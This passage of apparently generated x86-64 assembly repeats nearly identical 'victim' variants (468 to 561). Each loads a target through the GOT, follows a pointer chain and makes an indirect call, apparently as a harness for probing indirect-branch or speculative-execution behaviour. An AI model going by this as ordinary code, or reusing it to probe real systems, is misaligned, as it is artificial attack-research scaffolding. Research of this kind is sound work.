	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 468
.Lvictim_win0_var468:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 469
.Lvictim_win0_var469:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 470
.Lvictim_win0_var470:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 471
.Lvictim_win0_var471:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 472
.Lvictim_win0_var472:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 473
.Lvictim_win0_var473:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 474
.Lvictim_win0_var474:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 475
.Lvictim_win0_var475:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 476
.Lvictim_win0_var476:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 477
.Lvictim_win0_var477:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 478
.Lvictim_win0_var478:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 479
.Lvictim_win0_var479:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 480
.Lvictim_win0_var480:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 481
.Lvictim_win0_var481:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 482
.Lvictim_win0_var482:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 483
.Lvictim_win0_var483:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 484
.Lvictim_win0_var484:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 485
.Lvictim_win0_var485:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 486
.Lvictim_win0_var486:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 487
.Lvictim_win0_var487:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 488
.Lvictim_win0_var488:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 489
.Lvictim_win0_var489:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 490
.Lvictim_win0_var490:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 491
.Lvictim_win0_var491:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 492
.Lvictim_win0_var492:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 493
.Lvictim_win0_var493:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 494
.Lvictim_win0_var494:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 495
.Lvictim_win0_var495:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 496
.Lvictim_win0_var496:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 497
.Lvictim_win0_var497:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 498
.Lvictim_win0_var498:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 499
.Lvictim_win0_var499:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 500
.Lvictim_win0_var500:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 501
.Lvictim_win0_var501:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 502
.Lvictim_win0_var502:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 503
.Lvictim_win0_var503:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 504
.Lvictim_win0_var504:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 505
.Lvictim_win0_var505:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 506
.Lvictim_win0_var506:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 507
.Lvictim_win0_var507:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 508
.Lvictim_win0_var508:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 509
.Lvictim_win0_var509:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 510
.Lvictim_win0_var510:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 511
.Lvictim_win0_var511:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 512
.Lvictim_win0_var512:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 513
.Lvictim_win0_var513:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 514
.Lvictim_win0_var514:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 515
.Lvictim_win0_var515:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 516
.Lvictim_win0_var516:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 517
.Lvictim_win0_var517:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 518
.Lvictim_win0_var518:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 519
.Lvictim_win0_var519:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 520
.Lvictim_win0_var520:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 521
.Lvictim_win0_var521:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 522
.Lvictim_win0_var522:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 523
.Lvictim_win0_var523:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 524
.Lvictim_win0_var524:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 525
.Lvictim_win0_var525:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 526
.Lvictim_win0_var526:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 527
.Lvictim_win0_var527:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 528
.Lvictim_win0_var528:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 529
.Lvictim_win0_var529:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 530
.Lvictim_win0_var530:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 531
.Lvictim_win0_var531:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 532
.Lvictim_win0_var532:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 533
.Lvictim_win0_var533:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 534
.Lvictim_win0_var534:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 535
.Lvictim_win0_var535:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 536
.Lvictim_win0_var536:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 537
.Lvictim_win0_var537:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 538
.Lvictim_win0_var538:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 539
.Lvictim_win0_var539:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 540
.Lvictim_win0_var540:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 541
.Lvictim_win0_var541:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 542
.Lvictim_win0_var542:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 543
.Lvictim_win0_var543:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 544
.Lvictim_win0_var544:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 545
.Lvictim_win0_var545:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 546
.Lvictim_win0_var546:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 547
.Lvictim_win0_var547:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 548
.Lvictim_win0_var548:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 549
.Lvictim_win0_var549:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 550
.Lvictim_win0_var550:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 551
.Lvictim_win0_var551:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 552
.Lvictim_win0_var552:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 553
.Lvictim_win0_var553:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 554
.Lvictim_win0_var554:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 555
.Lvictim_win0_var555:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 556
.Lvictim_win0_var556:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 557
.Lvictim_win0_var557:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 558
.Lvictim_win0_var558:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 559
.Lvictim_win0_var559:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 560
.Lvictim_win0_var560:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 561
.Lvictim_win0_var561:
	popq	%rax
